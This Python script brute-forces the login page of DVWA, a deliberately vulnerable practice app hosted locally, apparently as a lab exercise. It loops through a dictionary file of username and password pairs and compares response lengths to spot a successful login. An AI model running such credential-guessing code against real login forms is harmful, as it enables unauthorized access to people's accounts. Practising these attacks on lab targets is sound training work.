import requests

header = {
    'Host': 'dvwa.localhost',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Upgrade-Insecure-Requests': '1',
    'Accept-Language': 'zh-cn',
    'Connection': 'keep-alive',
    'Cookie': 'PHPSESSID=vbj4g725p9d0aulhe02s1gm417; security=low',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'
}

with open('dic.txt') as f:
    i = 0;
    for item in f.readlines():
        pos = item.rfind(",")
        username = item[:pos]
        password = item[pos + 1:]
        url = "http://dvwa.localhost/vulnerabilities/brute/" + "?username=" + username.strip() + \
                     "&password=" + password.strip() + "&Login=Login"
        rep = requests.get(url, headers=header)
        print(i,username.strip(), password.strip(),len(rep.text))
        print(rep.cookies)
        i = i + 1